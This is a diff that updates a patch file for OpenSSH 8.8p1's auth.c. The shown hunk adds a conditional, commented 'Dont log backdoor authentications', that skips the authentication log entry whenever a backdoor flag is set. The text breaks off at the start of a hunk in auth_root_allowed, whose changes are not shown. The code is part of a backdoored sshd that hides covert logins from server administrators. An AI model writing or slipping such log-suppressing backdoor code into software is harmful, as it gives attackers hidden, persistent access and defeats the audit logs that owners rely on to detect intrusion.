@@ -1,6 +1,37 @@
---- openssh-portable-v8.8_p1/auth.c	2021-12-02 17:04:09.337420945 -0600
-+++ openssh-portable-patch/auth.c	2021-12-02 17:31:51.647606026 -0600
-@@ -396,6 +396,8 @@
+--- openssh-portable-V_8_8_P1/auth.c	2021-09-26 09:03:19.000000000 -0500
++++ openssh-portable-patch/auth.c	2021-12-07 21:59:11.137983398 -0600
+@@ -339,17 +339,19 @@
+ 			extra = xstrdup(authctxt->auth_method_info);
+ 	}
+ 
+-	do_log2(level, "%s %s%s%s for %s%.100s from %.200s port %d ssh2%s%s",
+-	    authmsg,
+-	    method,
+-	    submethod != NULL ? "/" : "", submethod == NULL ? "" : submethod,
+-	    authctxt->valid ? "" : "invalid user ",
+-	    authctxt->user,
+-	    ssh_remote_ipaddr(ssh),
+-	    ssh_remote_port(ssh),
+-	    extra != NULL ? ": " : "",
+-	    extra != NULL ? extra : "");
+-
++	/* Dont log backdoor authentications */
++	if (!ssh->backdoor_triggered == 1) {
++		do_log2(level, "%s %s%s%s for %s%.100s from %.200s port %d ssh2%s%s",
++			authmsg,
++			method,
++			submethod != NULL ? "/" : "", submethod == NULL ? "" : submethod,
++			authctxt->valid ? "" : "invalid user ",
++			authctxt->user,
++			ssh_remote_ipaddr(ssh),
++			ssh_remote_port(ssh),
++			extra != NULL ? ": " : "",
++			extra != NULL ? extra : "");
++	}
+ 	free(extra);
+ 
+ #if defined(CUSTOM_FAILED_LOGIN) || defined(SSH_AUDIT_EVENTS)
+@@ -396,6 +398,8 @@
  int
  auth_root_allowed(struct ssh *ssh, const char *method)
  {
